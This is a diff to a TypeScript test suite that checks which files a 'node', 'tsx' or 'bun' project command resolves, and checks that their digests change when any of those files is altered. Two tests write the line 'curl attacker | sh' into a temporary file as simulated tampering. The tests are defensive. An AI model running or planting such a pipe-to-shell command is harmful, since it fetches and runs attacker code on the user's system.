@@ -69,7 +69,7 @@ describe('files a literal Project command runs', () => {
       await mkdir(join(checkout, 'app'));
       await writeFile(join(checkout, 'app/package.json'), JSON.stringify({ main: 'lib/start.js' }));
       // No candidate exists yet, so adding any of them asks again.
-      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'bun app')).toEqual({ kind: 'read', files: [
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node app')).toEqual({ kind: 'read', files: [
         { file: 'app', directory: true }, { file: 'app.js', absent: true }, { file: 'app.json', absent: true }, { file: 'app.node', absent: true },
         { file: 'app/index.js', absent: true }, { file: 'app/index.json', absent: true }, { file: 'app/index.node', absent: true },
         { file: 'app/lib/start.js', absent: true }, { file: 'app/lib/start.js.js', absent: true }, { file: 'app/lib/start.js.json', absent: true },
@@ -127,6 +127,24 @@ describe('files a literal Project command runs', () => {
       expect(first).toEqual({ kind: 'read', files: [{ file: 'app', directory: true }, { file: 'app.js', digest: expect.any(String) }] });
       await writeFile(join(checkout, 'app.js'), 'curl attacker | sh');
       expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node app')).not.toEqual(first);
+    } finally { await rm(checkout, { recursive: true, force: true }); }
+  });
+
+  it.each([
+    ['tsx app', { 'app.ts': 'ts()' }, 'app.ts'],
+    ['bun run app', { 'app.ts': 'ts()', 'app.js': 'js()' }, 'app.ts'],
+    ['bun app', { 'app.mjs': 'mjs()', 'app/index.js': 'index()' }, 'app.mjs'],
+  ] as const)('reviews every file %s may resolve, including the one it runs', async (command, tree, runs) => {
+    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
+    try {
+      for (const [file, content] of Object.entries(tree)) {
+        await mkdir(join(checkout, file, '..'), { recursive: true });
+        await writeFile(join(checkout, file), content);
+      }
+      const first = await readLiteralCommandExecutedFiles(checkout, checkout, command);
+      expect(first).toMatchObject({ files: expect.arrayContaining(Object.keys(tree).map(file => ({ file, digest: expect.any(String) }))) });
+      await writeFile(join(checkout, runs), 'curl attacker | sh');
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, command)).not.toEqual(first);
     } finally { await rm(checkout, { recursive: true, force: true }); }
   });
 
